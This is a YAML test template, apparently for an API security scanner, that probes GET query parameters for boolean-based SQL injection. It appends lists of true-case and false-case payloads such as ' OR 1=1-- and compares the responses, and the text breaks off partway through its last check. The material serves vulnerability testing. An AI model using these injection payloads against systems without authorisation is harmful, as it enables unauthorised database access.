api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    eq: "GET"
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
      - <html>
      - </html>

  query_param:
    for_one:
      key:
        regex: ".*"
        extract: userKey
      value:
        extract: userVal
wordLists:
  trueCasePayloads:
    - "' OR '1'='1"
    - "\" OR \"1\"=\"1"
    - "') OR ('1'='1"
    - "') OR '1'='1'--"
    - "\" OR \"1\"=\"1\"--"
    - "' OR 1=1--"
    - "\" OR 1=1--"
    - "') OR 1=1--"
    - "') OR ('a'='a"
    - "') OR 'a'='a'--"
    - "\" OR \"a\"=\"a\""
    - "\" OR \"a\"=\"a\"--"
  falseCasePayloads:
    - "' AND '1'='2"
    - "\" AND \"1\"=\"2"
    - "') AND ('1'='2"
    - "') AND '1'='2'--"
    - "\" AND \"1\"=\"2\"--"
    - "' AND 1=2--"
    - "\" AND 1=2--"
    - "') AND 1=2--"
    - "') AND ('a'='b"
    - "') AND 'a'='b'--"
    - "\" AND \"a\"=\"b\""
    - "\" AND \"a\"=\"b\"--"
execute:
  type: multiple
  requests:
    - req:
        - modify_query_param:
            userKey: ${userVal}${falseCasePayloads}
        - validate:
            or:
              - response_code:
                  gte: 400
                  lt: 410
              - response_payload:
                  not_contains:
                    - Error
                    - fail
                    - invalid
                    - expired
                    - not found
                    - account is locked
                    - account is blocked
                    - rate-limit
                    - rate_limit
                    - rate limit
                    - multiple failed attempt
                    - Attention Required!
                    - CloudFlare
                    - Sorry, you have been blocked
                    - " AND "
                    - "="
                    - "--"
        - success: x2
        - failure: exit
    - req:
        - modify_query_param:
            userKey: ${userVal}${trueCasePayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              neq: "${x1.response.body}"
              not_contains:
                - rate-limit
                - rate limit
                - rate_limit
                - account is locked
                - account is blocked
                - multiple failed attempt
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - " OR "
                - "="
                - "--"
                - "fail"
                - "invalid"
                - <html>
                - </html>
        - success: x3
        - failure: exit
    - req:
        - add_header:
            dummyHeader: dummyValue
        - modify_query_param:
            userKey: ${userVal}${trueCasePayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              eq: "${x2.response.body}"
              not_contains:
                - rate-limit
                - rate limit
                - rate_limit
                - account is locked
                - account is blocked
                - multiple failed attempt
                - Attention Required!
